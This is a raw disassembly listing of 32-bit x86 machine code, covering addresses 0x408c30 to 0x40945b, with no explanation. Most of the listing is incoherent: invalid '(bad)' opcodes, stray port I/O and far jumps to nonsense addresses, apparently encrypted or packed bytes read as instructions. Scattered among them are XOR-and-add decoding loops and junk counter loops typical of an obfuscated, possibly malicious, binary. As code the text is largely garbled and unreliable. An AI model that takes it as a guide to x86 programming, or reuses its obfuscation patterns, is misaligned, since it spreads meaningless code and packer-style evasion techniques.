  408c30:	ror    DWORD PTR [ebp-0x32],cl
  408c33:	cwde   
  408c34:	pop    edx
  408c35:	push   0xffffffdf
  408c37:	arpl   dx,sp
  408c39:	clc    
  408c3a:	jnp    0x408bee
  408c3c:	or     bh,BYTE PTR [edx-0x4270bf0c]
  408c42:	inc    ebx
  408c43:	(bad)  
  408c44:	sti    
  408c45:	push   ebp
  408c46:	div    DWORD PTR [edx-0x1]
  408c49:	sar    DWORD PTR [edx],1
  408c4b:	inc    esi
  408c4c:	mov    ds:0xc05f9e7f,al
  408c51:	imul   ebx,DWORD PTR [esp+esi*4-0x2e],0xa23cf60e
  408c59:	xor    edx,0xfffffffa
  408c5c:	jnp    0x408c72
  408c5e:	lods   eax,DWORD PTR ds:[esi]
  408c5f:	ins    DWORD PTR es:[edi],dx
  408c60:	adc    BYTE PTR [eax],dh
  408c62:	repz or edx,DWORD PTR [edi]
  408c65:	cmp    bh,BYTE PTR [esi-0x67]
  408c68:	xchg   esp,eax
  408c69:	mov    edi,0x8c9002f9
  408c6e:	mov    ah,0xd
  408c70:	mov    BYTE PTR [edi+0x7bbce25c],ch
  408c76:	sti    
  408c77:	or     eax,0xd0f0c96d
  408c7c:	sbb    al,0xa0
  408c7e:	or     esi,DWORD PTR [eax]
  408c80:	stc    
  408c81:	neg    BYTE PTR [esi+0x2d568799]
  408c87:	call   0xc4dfd6e
  408c8c:	jnp    0x408cef
  408c8e:	inc    esp
  408c8f:	mov    ds:0xca330821,eax
  408c94:	sub    al,0x98
  408c96:	pop    ds
  408c97:	(bad)  
  408c98:	jl     0x408ca8
  408c9a:	jb     0x408c61
  408c9c:	pop    edi
  408c9d:	sahf   
  408c9e:	mov    dh,0x71
  408ca0:	icebp  
  408ca1:	cmc    
  408ca2:	push   ds
  408ca3:	outs   dx,BYTE PTR ds:[esi]
  408ca4:	or     BYTE PTR [ecx+ebp*2-0x1a],ah
  408ca8:	inc    ebx
  408ca9:	adc    eax,0xdd62e6c8
  408cae:	sbb    eax,ebx
  408cb0:	push   ebp
  408cb1:	adc    eax,0xc3f2ca56
  408cb6:	push   es
  408cb7:	popf   
  408cb8:	imul   edx,DWORD PTR [ebp-0x6d],0xff5891cb
  408cbf:	jmp    0x408c8c
  408cc1:	sub    BYTE PTR ds:[edi+0x2c],bl
  408cc5:	addr16 mov al,0xdc
  408cc8:	jmp    0x408d0b
  408cca:	sbb    al,0x70
  408ccc:	dec    edi
  408ccd:	adc    edx,edx
  408ccf:	inc    esp
  408cd0:	sbb    BYTE PTR [ebp-0x3dc1f626],ah
  408cd6:	xor    al,0x4f
  408cd8:	dec    ebp
  408cd9:	mov    ds:0xeb3c3897,eax
  408cde:	inc    ebx
  408cdf:	adc    dh,BYTE PTR [eax-0x4878365e]
  408ce5:	or     al,0xf
  408ce7:	mov    bh,0x4
  408ce9:	nop
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0xda3
  408d20:	sub    cl,BYTE PTR [ebx+0x7e2f39db]
  408d26:	jle    0x408d32
  408d28:	jg     0x408da8
  408d2a:	jle    0x408d86
  408d2c:	inc    BYTE PTR [ebx-0xb2b76b2]
  408d32:	das    
  408d33:	xchg   esp,eax
  408d34:	(bad)
  408d38:	(bad)  
  408d39:	das    
  408d3a:	addr16 mov ecx,0x4e5f1535
  408d40:	push   ss
  408d41:	pop    eax
  408d42:	into   
  408d43:	jle    0x408d51
  408d45:	(bad)  
  408d46:	cli    
  408d47:	cmp    esi,DWORD PTR [esp+eax*2]
  408d4a:	add    eax,0xcc147893
  408d4f:	sbb    edi,DWORD PTR [ebx-0x6126c7e8]
  408d55:	ror    DWORD PTR [ebp-0x3a],1
  408d58:	(bad)  
  408d5a:	into   
  408d5b:	or     al,0xaf
  408d5d:	(bad)  
  408d5f:	scas   eax,DWORD PTR es:[edi]
  408d60:	jb     0x408d8f
  408d62:	add    DWORD PTR [esi-0x1],ebp
  408d65:	or     al,BYTE PTR [ebx-0x659e759]
  408d6b:	or     DWORD PTR [ecx],edi
  408d6d:	jecxz  0x408dbe
  408d6f:	push   0x1d
  408d71:	cmc    
  408d72:	or     ecx,DWORD PTR [ecx]
  408d74:	pop    ecx
  408d75:	jo     0x408dee
  408d77:	jp     0x408d37
  408d79:	adc    BYTE PTR ds:0xbe5538eb,0xb4
  408d80:	jnp    0x408df0
  408d82:	adc    BYTE PTR [eax+0x19],bh
  408d85:	adc    ch,BYTE PTR [ebx+0x3d]
  408d88:	repnz or al,0x5c
  408d8b:	xchg   edi,ebx
  408d8d:	das    
  408d8e:	inc    eax
  408d8f:	mov    edx,0xd754dead
  408d94:	bound  esi,QWORD PTR [ecx]
  408d96:	jl     0x408d46
  408d98:	inc    edi
  408d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d9a:	sbb    edi,esi
  408d9c:	sbb    al,0x7
  408d9e:	mov    ch,0x3e
  408da0:	add    DWORD PTR [esi],ebp
  408da2:	pop    edi
  408da3:	and    al,0x3
  408da5:	rcr    bh,cl
  408da7:	mov    eax,0x393880ad
  408dac:	fbld   TBYTE PTR ds:0x32fd4c48
  408db2:	pop    edi
  408db3:	or     edi,DWORD PTR [ebx-0x4f]
  408db6:	and    al,0xf2
  408db8:	mov    fs,WORD PTR [edi+edx*4+0x56ee76b9]
  408dbf:	ins    DWORD PTR es:[edi],dx
  408dc0:	in     al,dx
  408dc1:	xor    ah,BYTE PTR [edx+0x74d5d6b0]
  408dc7:	in     eax,0x2e
  408dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dca:	push   ebp
  408dcb:	dec    eax
  408dcc:	int3   
  408dcd:	adc    eax,0xce33598c
  408dd2:	std    
  408dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dd4:	out    0xa5,eax
  408dd6:	std    
  408dd7:	push   ss
  408dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd9:	pop    esp
  408dda:	fnstcw WORD PTR [edx+0x66]
  408ddd:	loopne 0x408e09
  408ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de0:	mov    eax,ds:0x39b7768
  408de5:	mov    ds:0x79fea50,eax
  408dea:	pop    ds
  408deb:	or     dh,BYTE PTR [eax+edx*2-0x5510fd25]
  408df2:	adc    ebx,DWORD PTR [edx+edx*8-0x61]
  408df6:	push   edx
  408df7:	test   al,0x74
  408df9:	and    eax,0xb15e91d1
  408dfe:	inc    ebx
  408dff:	in     al,dx
  408e00:	pop    ecx
  408e01:	shr    BYTE PTR [edi+0x119c1e0c],0x2e
  408e08:	test   al,0x56
  408e0a:	or     ebx,DWORD PTR [ecx+eiz*1]
  408e0d:	test   BYTE PTR [esi],al
  408e0f:	aas    
  408e10:	popf   
  408e11:	fstp   TBYTE PTR [esi+0x75]
  408e14:	jecxz  0x408e89
  408e16:	repnz addr16 nop
  408e19:	push   esi
  408e1a:	mov    edx,0xf5845f2e
  408e1f:	jo     0x408e8d
  408e21:	call   0x313fcfa8
  408e26:	lea    esi,[eax]
  408e28:	jl     0x408e5f
  408e2a:	jle    0x408e10
  408e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2d:	jnp    0x408df8
  408e2f:	verr   WORD PTR [eax+0x1e3d0868]
  408e36:	sahf   
  408e37:	add    eax,esi
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x64c9de2b
  408e4e:	dec    esp
  408e4f:	jbe    0x408e86
  408e51:	sub    al,0x7e
  408e53:	jle    0x408e5f
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e3c
  408e59:	jo     0x408ed6
  408e5b:	retf   0xe4e0
  408e5e:	cli    
  408e5f:	jne    0x408eb7
  408e61:	enter  0x42df,0xeb
  408e65:	mov    ebp,DWORD PTR [ebx-0x60]
  408e68:	mov    cl,0x3a
  408e6a:	push   ds
  408e6b:	mov    bl,0x41
  408e6d:	adc    esi,DWORD PTR [ebp-0x5c]
  408e70:	je     0x408e5b
  408e72:	les    ebx,FWORD PTR [ecx+edx*1+0x336a823a]
  408e79:	int3   
  408e7a:	inc    edi
  408e7b:	or     BYTE PTR [ecx-0x21],0x72
  408e7f:	xchg   BYTE PTR [eax-0x114637c3],dh
  408e85:	sub    eax,0x9f4bcd88
  408e8a:	ja     0x408e40
  408e8c:	pushf  
  408e8d:	sbb    bl,dh
  408e8f:	xor    dl,BYTE PTR [ebx]
  408e91:	clc    
  408e92:	xchg   esi,eax
  408e93:	mov    esp,0x8ea8f4ff
  408e98:	pop    DWORD PTR [ebx]
  408e9a:	add    esp,ecx
  408e9c:	cdq    
  408e9d:	cmp    edi,ecx
  408e9f:	sti    
  408ea0:	std    
  408ea1:	mov    ebx,0x1f4499b4
  408ea6:	xor    BYTE PTR [edi-0xf],al
  408ea9:	dec    edx
  408eaa:	out    dx,al
  408eab:	xor    cl,BYTE PTR [ebx+edi*8+0x62]
  408eaf:	mov    eax,ds:0x1e7ef6e0
  408eb4:	int3   
  408eb5:	sbb    ecx,DWORD PTR [esi-0x7f]
  408eb8:	in     eax,dx
  408eb9:	sbb    bl,BYTE PTR [ebx+ecx*2]
  408ebc:	(bad)  
  408ebd:	out    dx,eax
  408ebe:	and    eax,0x5d2ba8a6
  408ec3:	int3   
  408ec4:	add    dh,0x93
  408ec7:	in     eax,dx
  408ec8:	xchg   ebp,eax
  408ec9:	push   0xcfd564c3
  408ece:	imul   ebx,DWORD PTR gs:[ebx],0xdbe89b33
  408ed5:	dec    eax
  408ed6:	enter  0x13c,0xf2
  408eda:	xchg   edi,eax
  408edb:	lahf   
  408edc:	js     0x408f07
  408ede:	mov    al,ds:0x47c16ed5
  408ee3:	(bad)  
  408ee4:	mov    ch,0xbd
  408ee6:	addr16 pop es
  408ee8:	inc    esi
  408ee9:	pushf  
  408eea:	push   DWORD PTR [eax]
  408eec:	push   edi
  408eed:	lods   al,BYTE PTR ds:[esi]
  408eee:	mov    esp,0x8505ac6
  408ef3:	and    esi,DWORD PTR [edx+ebx*1]
  408ef6:	in     eax,0x22
  408ef8:	mov    eax,ds:0x3f858055
  408efd:	xchg   edi,eax
  408efe:	push   ebx
  408eff:	adc    bh,BYTE PTR ds:0xd3f909dc
  408f05:	into   
  408f06:	sbb    eax,0x9d98d12a
  408f0b:	jmp    0x408f41
  408f0d:	in     eax,dx
  408f0e:	out    0x60,eax
  408f10:	xor    dl,BYTE PTR [esp+edx*1-0x12]
  408f14:	xor    al,0xf7
  408f16:	mov    esi,0x6595e690
  408f1b:	dec    esp
  408f1c:	popf   
  408f1d:	ret    
  408f1e:	add    DWORD PTR [ecx-0x56],eax
  408f21:	ds cli 
  408f23:	mov    WORD PTR [esi],ds
  408f25:	mov    edi,0xc6aa0c1
  408f2a:	pop    ds
  408f2b:	(bad)  
  408f2c:	jmp    0x408f5d
  408f2e:	mov    ebp,0x6f8b69f7
  408f33:	cwde   
  408f34:	fisttp WORD PTR [ebp+0x5e]
  408f37:	jg     0x408f22
  408f39:	jb     0x408ed4
  408f3b:	xor    ch,BYTE PTR [esi+0x0]
  408f3e:	imul   esp,edi,0xffffffe3
  408f41:	loop   0x408ed7
  408f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f44:	mov    edx,0xb6e526cc
  408f49:	pop    es
  408f4a:	loope  0x408f95
  408f4c:	lods   eax,DWORD PTR ds:[esi]
  408f4d:	jne    0x408f92
  408f4f:	(bad)  
  408f50:	mov    ?,WORD PTR [esi-0x15]
  408f53:	jbe    0x408f94
  408f55:	pop    ebx
  408f56:	pop    edi
  408f57:	ror    DWORD PTR [ebx-0x862cf25],1
  408f5d:	jb     0x408fd0
  408f5f:	neg    BYTE PTR [edi-0x20]
  408f62:	mov    ch,0x3
  408f64:	mov    eax,DWORD PTR [ebp-0x8]
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xb9cfb935
  408fab:	pop    ds
  408fac:	adc    eax,0x7e7e2dc1
  408fb1:	or     bh,BYTE PTR [edi+0x7e]
  408fb4:	jle    0x408fa4
  408fb6:	fwait
  408fb7:	icebp  
  408fb8:	adc    eax,0xf083b3d6
  408fbd:	and    eax,0xfe624f39
  408fc2:	fidiv  DWORD PTR [esi-0x77248ded]
  408fc8:	das    
  408fc9:	adc    BYTE PTR [edx],al
  408fcb:	push   edi
  408fcc:	test   eax,0xeb5d460a
  408fd1:	lahf   
  408fd2:	xlat   BYTE PTR ds:[ebx]
  408fd3:	lahf   
  408fd4:	test   al,0x94
  408fd6:	xchg   edx,ebx
  408fd8:	mov    edi,0xd84f2023
  408fdd:	inc    ebx
  408fde:	ret    0x2067
  408fe1:	jl     0x408f8f
  408fe3:	mov    ds:0xb3d03029,eax
  408fe8:	cdq    
  408fe9:	add    al,0x2c
  408feb:	xchg   esi,eax
  408fec:	push   cs
  408fed:	aaa    
  408fee:	(bad)  
  408fef:	rcl    BYTE PTR [esi+0x759cad87],1
  408ff5:	cmp    eax,0xa3eae8a8
  408ffa:	cld    
  408ffb:	mov    bl,0xeb
  408ffd:	jg     0x408fba
  408fff:	add    eax,0xd3f6473e
  409004:	ret    
  409005:	mov    DWORD PTR [edi+eax*8-0x227db22c],edi
  40900c:	ret    
  40900d:	aas    
  40900e:	lods   al,BYTE PTR ds:[esi]
  40900f:	pop    edi
  409010:	push   eax
  409011:	push   esp
  409012:	mov    dl,0x4b
  409014:	add    BYTE PTR [ecx-0x5d],al
  409017:	inc    edx
  409018:	das    
  409019:	pop    ss
  40901a:	shl    BYTE PTR [ecx-0x17],1
  40901d:	test   eax,0x5cbdd057
  409022:	add    bl,cl
  409024:	sti    
  409025:	jecxz  0x40909b
  409027:	adc    al,0xdd
  409029:	pop    ebp
  40902a:	pop    ss
  40902b:	cmp    al,0x89
  40902d:	adc    BYTE PTR [esi-0x791267ed],al
  409033:	outs   dx,DWORD PTR ds:[esi]
  409034:	in     eax,0xb7
  409036:	outs   dx,BYTE PTR ds:[esi]
  409037:	fdiv   st,st(7)
  409039:	mov    esp,0x2fc37bf6
  40903e:	aas    
  40903f:	(bad)  
  409040:	xor    DWORD PTR [edi-0x25],esi
  409043:	(bad)  
  409044:	push   edi
  409045:	push   eax
  409046:	retf   
  409047:	xchg   ebp,eax
  409048:	push   edi
  409049:	jne    0x4090ac
  40904b:	je     0x409003
  40904d:	mov    edx,0x3239b20a
  409052:	jecxz  0x40901b
  409054:	daa    
  409055:	sbb    dl,BYTE PTR [eax-0x72c9b19]
  40905b:	mov    esi,0xfe5ef1b1
  409060:	cmp    eax,0xc99878db
  409065:	push   edx
  409066:	dec    ecx
  409067:	xchg   ebp,eax
  409068:	clc    
  409069:	mov    ebp,DWORD PTR [edx]
  40906b:	push   ebx
  40906c:	imul   edx,DWORD PTR [ebx+ebp*2+0x117a5e6e],0xffffff8e
  409074:	push   ss
  409075:	pop    esi
  409076:	mov    ch,0x95
  409078:	mov    dh,0x6a
  40907a:	push   0xd890f506
  40907f:	sub    ebp,DWORD PTR [ebp+0x1b]
  409082:	push   ebp
  409083:	lock aas 
  409085:	add    al,0xbe
  409087:	sbb    bh,ch
  409089:	aad    0x6d
  40908b:	sbb    edx,esp
  40908d:	inc    edi
  40908e:	or     DWORD PTR [eax-0x1a226aee],0x7a1e49e
  409098:	stos   BYTE PTR es:[edi],al
  409099:	or     BYTE PTR [esi+0x7c2f14cf],cl
  40909f:	adc    ebx,ebx
  4090a1:	xchg   DWORD PTR [edx],edx
  4090a3:	jge    0x409029
  4090a5:	rol    BYTE PTR [eax+0x3b],cl
  4090a8:	shr    edi,cl
  4090aa:	jp     0x409118
  4090ac:	out    dx,eax
  4090ad:	jbe    0x409074
  4090af:	adc    eax,0xa645bd9d
  4090b4:	inc    edx
  4090b5:	daa    
  4090b6:	aam    0x5
  4090b8:	and    al,0x96
  4090ba:	outs   dx,BYTE PTR ds:[esi]
  4090bb:	xlat   BYTE PTR ds:[ebx]
  4090bc:	fs gs lahf 
  4090bf:	xor    BYTE PTR [edi+0x3312be0f],ah
  4090c5:	rol    DWORD PTR [ebx],0xc6
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	inc    edi
  4090fb:	lods   eax,DWORD PTR ds:[esi]
  4090fc:	imul   esp,DWORD PTR [edi+0x7e7e22dd],0xa
  409103:	jg     0x409183
  409105:	jle    0x4090f1
  409107:	lods   eax,DWORD PTR ds:[esi]
  409108:	les    edx,FWORD PTR [eax+edi*4-0x46]
  40910c:	jns    0x4090b4
  40910e:	test   al,0xad
  409110:	sub    DWORD PTR [ecx-0x1646dd00],esp
  409116:	ja     0x4090fe
  409118:	sbb    ebx,DWORD PTR ds:[edi+0x23]
  40911c:	sub    eax,0xd2095fc7
  409121:	sbb    ebp,DWORD PTR [ecx]
  409123:	bswap  eax
  409125:	stos   BYTE PTR es:[edi],al
  409126:	shr    BYTE PTR [eax+0x3e],cl
  409129:	sub    BYTE PTR [ecx],0xc4
  40912c:	inc    esi
  40912d:	cmp    DWORD PTR [ebx+0x5b9c975c],eax
  409133:	popa   
  409134:	scas   eax,DWORD PTR es:[edi]
  409135:	add    bl,BYTE PTR [ecx+0x22805ecd]
  40913b:	pop    edi
  40913c:	je     0x409171
  40913e:	fs jle 0x4090cf
  409141:	mov    eax,DWORD PTR [ebx-0x6a5c35f8]
  409147:	cdq    
  409148:	out    0x62,eax
  40914a:	ss inc ecx
  40914c:	mov    ecx,0x7f548f57
  409151:	data16 (bad) 
  409154:	cmc    
  409155:	mov    bh,0x69
  409157:	sbb    al,0x9f
  409159:	jmp    0x8427:0xd652b805
  409160:	leave  
  409161:	xchg   ecx,eax
  409162:	cmp    al,0x77
  409164:	addr16 cli 
  409166:	inc    eax
  409167:	out    0xa3,al
  409169:	dec    esp
  40916a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40916b:	pop    esi
  40916c:	push   es
  40916d:	ficomp WORD PTR [edx+0x79]
  409170:	aam    0x46
  409172:	mov    edi,0x9c81ad04
  409177:	test   eax,0x1686c42e
  40917c:	adc    eax,0x6404c106
  409181:	call   0x9c5:0x149641f6
  409188:	lahf   
  409189:	add    ebp,ecx
  40918b:	je     0x40919a
  40918d:	jecxz  0x4091b3
  40918f:	mov    edi,0xf6ed91da
  409194:	add    esi,ebx
  409196:	xchg   ebx,eax
  409197:	in     al,0xd2
  409199:	retf   
  40919a:	ins    DWORD PTR es:[edi],dx
  40919b:	je     0x409208
  40919d:	cmp    ebp,ebp
  40919f:	retf   0x4188
  4091a2:	add    DWORD PTR [eax-0x7e],eax
  4091a5:	sub    cl,BYTE PTR [edi]
  4091a7:	push   esp
  4091a8:	ficom  WORD PTR [edi-0x5a4086d0]
  4091ae:	inc    ecx
  4091af:	jne    0x40917e
  4091b1:	sbb    DWORD PTR [edx],esp
  4091b3:	inc    ebp
  4091b4:	lds    edi,FWORD PTR [esi-0x49bfc957]
  4091ba:	aaa    
  4091bb:	es js  0x409218
  4091be:	inc    edx
  4091bf:	dec    edx
  4091c0:	sub    esp,DWORD PTR [edx+0x1d1259ac]
  4091c6:	fucomip st,st(4)
  4091c8:	pop    eax
  4091c9:	(bad)  
  4091ca:	idiv   cl
  4091cc:	jae    0x4091c4
  4091ce:	test   eax,0x2fe8691d
  4091d3:	jo     0x40917a
  4091d5:	cmp    al,0x1d
  4091d7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d9:	out    0x84,eax
  4091db:	in     al,0x55
  4091dd:	les    edi,FWORD PTR cs:[ebx-0x3d]
  4091e1:	add    BYTE PTR [ebp-0x6a],al
  4091e4:	je     0x409174
  4091e6:	sti    
  4091e7:	(bad)  
  4091e8:	clc    
  4091e9:	mov    edx,0xd705e28
  4091ee:	pop    esi
  4091ef:	(bad)  
  4091f0:	addr16 lock cld 
  4091f3:	sub    DWORD PTR [ecx+esi*2],ebp
  4091f6:	adc    eax,0x6089213b
  4091fb:	lds    edx,FWORD PTR [esi-0x382461e3]
  409201:	int    0x1c
  409203:	inc    eax
  409204:	mov    eax,DWORD PTR [ebp+edx*8-0x43c2d1f9]
  40920b:	and    eax,0x2223e0d1
  409210:	adc    al,0x4e
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x4e785839]
  409240:	mov    fs,WORD PTR [ebx+0x7e23e9d1]
  409246:	jle    0x409252
  409248:	jg     0x4092c8
  40924a:	jle    0x409251
  40924c:	lods   al,BYTE PTR ds:[esi]
  40924d:	and    ecx,DWORD PTR [eax-0x5ce09cc1]
  409253:	sbb    BYTE PTR [ebx+0xa],cl
  409256:	jb     0x409286
  409258:	test   eax,0x33e3a260
  40925d:	push   ss
  40925e:	or     ebx,0xb0ad8388
  409264:	inc    eax
  409265:	sub    BYTE PTR [esi],al
  409267:	cmc    
  409268:	pop    ecx
  409269:	and    BYTE PTR [ebp-0x5199bd38],cl
  40926f:	in     al,dx
  409270:	mov    bh,0xe3
  409272:	nop
  409273:	push   esi
  409274:	ins    DWORD PTR es:[edi],dx
  409275:	gs xchg ebp,eax
  409277:	push   cs
  409278:	gs push cs
  40927a:	jmp    0xa47d:0x97d0b757
  409281:	xor    BYTE PTR [eax+eiz*4-0x5e],cl
  409285:	xchg   esp,eax
  409286:	inc    esi
  409287:	xchg   edi,eax
  409288:	lods   al,BYTE PTR ds:[esi]
  409289:	imul   DWORD PTR [esi-0x4ee2c9f3]
  40928f:	mov    ?,eax
  409291:	pusha  
  409292:	cli    
  409293:	mov    ah,0x81
  409295:	sub    al,BYTE PTR [ebx+0x37b1c32e]
  40929b:	test   eax,0x1a10c397
  4092a0:	ret    
  4092a1:	not    BYTE PTR [esi+esi*2+0xbb45811]
  4092a8:	add    edx,ebp
  4092aa:	dec    ebp
  4092ab:	sti    
  4092ac:	sub    ecx,esi
  4092ae:	mov    al,ds:0x9a1b696c
  4092b3:	fidivr DWORD PTR [ecx-0x1a]
  4092b6:	pop    es
  4092b7:	push   eax
  4092b8:	xor    DWORD PTR [edi+eax*2+0x35],eax
  4092bc:	sbb    ebx,DWORD PTR [edi-0x32a0f8f]
  4092c2:	les    eax,FWORD PTR [edi]
  4092c4:	ror    BYTE PTR [eax],0xe7
  4092c7:	mov    esp,DWORD PTR [esi]
  4092c9:	fs sbb bh,0xb1
  4092cd:	inc    esi
  4092ce:	out    0x20,al
  4092d0:	mov    edi,DWORD PTR [edx]
  4092d2:	loopne 0x409300
  4092d4:	aas    
  4092d5:	cmp    eax,DWORD PTR [ebp-0x6142e1ae]
  4092db:	adc    eax,0xfa1e5bca
  4092e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092e1:	lods   al,BYTE PTR ds:[esi]
  4092e2:	test   DWORD PTR ds:0xdd99a6c0,eax
  4092e8:	mov    dl,0x6f
  4092ea:	lods   eax,DWORD PTR ds:[esi]
  4092eb:	stos   DWORD PTR es:[edi],eax
  4092ec:	iret   
  4092ed:	or     al,0x4d
  4092ef:	mov    esi,0x65e9a5f4
  4092f4:	fwait
  4092f5:	rol    BYTE PTR ds:0x26e3fa55,cl
  4092fb:	pop    edi
  4092fc:	neg    DWORD PTR [edi+0x71]
  4092ff:	inc    edi
  409300:	xchg   ecx,eax
  409301:	std    
  409302:	mov    ch,0x74
  409304:	cmp    ax,0x78c2
  409308:	jnp    0x4092f0
  40930a:	in     eax,dx
  40930b:	ja     0x40937a
  40930d:	test   esi,ecx
  40930f:	fwait
  409310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409311:	dec    edi
  409312:	call   0x93d8:0xeb5b12a6
  409319:	in     eax,dx
  40931a:	jge    0x409341
  40931c:	dec    edi
  40931d:	cli    
  40931e:	xor    BYTE PTR [eax],al
  409320:	pop    ebx
  409321:	pop    ss
  409322:	aam    0xb1
  409324:	fisubr WORD PTR [eax-0x511c895e]
  40932a:	cmp    al,BYTE PTR [ebx-0x510c4197]
  409330:	xor    bh,ah
  409332:	pop    esp
  409333:	dec    eax
  409334:	rcl    BYTE PTR [ecx-0x7e75c584],1
  40933a:	pop    ss
  40933b:	pop    DWORD PTR [ebp+0x50]
  40933e:	wbinvd 
  409340:	stos   DWORD PTR es:[edi],eax
  409341:	repnz test BYTE PTR [eax-0x1439f5ce],bh
  409348:	(bad)  
  409349:	repnz (bad) 
  40934b:	jle    0x4092fa
  40934d:	jnp    0x4093c3
  40934f:	pop    edi
  409350:	adc    DWORD PTR [esi+0x51],0x5a
  409354:	rol    edx,1
  409356:	imul   ecx,DWORD PTR [ebx-0x39fcefb3],0xffffff89
  40935d:	add    DWORD PTR [esi-0x37],ebx
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4235d7,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4235d7
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4235cf,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4235cf
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4235cf,edx
  4093bd:	cmp    DWORD PTR ds:0x4235cf,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4235cf,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x420127
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
